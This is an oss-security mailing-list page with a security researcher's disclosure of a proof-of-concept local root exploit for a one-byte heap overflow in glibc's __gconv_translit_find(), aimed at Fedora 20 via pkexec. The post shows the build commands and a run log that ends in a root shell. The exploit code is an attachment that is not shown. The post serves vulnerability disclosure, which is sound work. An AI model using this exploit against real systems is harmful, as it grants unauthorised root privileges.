  oss-security - glibc __gconv_translit_find() exploit            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Mon, 25 Aug From: Tavis Ormandy <taviso@...gle.com> To: fulldisclosure@...lists.org, oss-security@...ts.openwall.com Subject: glibc __gconv_translit_find() exploit  List, back in July, I described a fiendish single-fixed-byte heap metadata overflow in the glibc internal routine __gconv_translit_find().  This is caused by the file extension being incorrectly appended to the transliteration module filename. The result is one too few bytes are allocated, and a single nul byte is written out of bounds. This issue affects real programs, that are typically default installed and setuid root.  Despite explaining that my research suggests this is exploitable, it appears there has been general skepticism that single-fixed-byte overflows are still exploitable with modern allocator metadata hardening.  As a result, the issue has been largely dismissed and downgraded in severity. As little progress has been made in resolving the issue thus far, we're publishing a proof of concept today. This exploit is specific to Fedora 20 32-bit, but the issue is not specific to Fedora, and exploitation on other systems and platforms is possible.  This issue is complex, and fiendishly difficult to exploit. Thanks to Chris Evans for his heap expertise and insight. Some more information is available on our team blog.   $ make clean rm -f pkexploit pty *.o a.out *.so [taviso@...alhost glibc]$ make cc -ggdb3 -O0 -Wno-multichar -std=gnu99 -ldl  pkexploit.c   -o pkexploit cc -ggdb3 -O0 -Wno-multichar -std=gnu99 -ldl  pty.c   -o pty cc -ggdb3 -O0 -Wno-multichar -std=gnu99  -c -o exploit.o exploit.c cc exploit.o -fPIC -shared -o exploit.so Execute pkexploit to attempt exploitation. [taviso@...alhost glibc]$ ./pkexploit [*] --------------------------------------------------- [*] glibc __gconv_translit_find() exploit [*] ------------------------ taviso & scarybeasts ----- [*] Attempting to invoke pseudo-pty helper (this will take a few seconds)... [*] Read bytes of output from pseudo-pty helper, parsing... [*] pseudo-pty helper succeeded [*] attempting to parse libc fatal error message... [*] discovered chunk pointer from `corrupted double-lin...`, => [*] attempting to parse the libc maps dump... [*] found libc.so mapped [*] expecting libc.so bss to begin at [*] successfully located first morecore chunk w/tag [*] allocating space for argument structure... [*] creating command string... [*] creating a tls_dtor_list node... [*] open_translit() symbol will be at [*] offsetof(struct known_trans, fname) => 32 [*] appending `./exploit.so` to list node [*] building parameter list... [*] anticipating tls_dtor_list to be at [*] execvpe(pkexec...)... Error accessing / : File name too long uid=0(root) sh-4.2# exit exit  Content of type "text/html" skipped  Download attachment of type "application/x-gzip" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      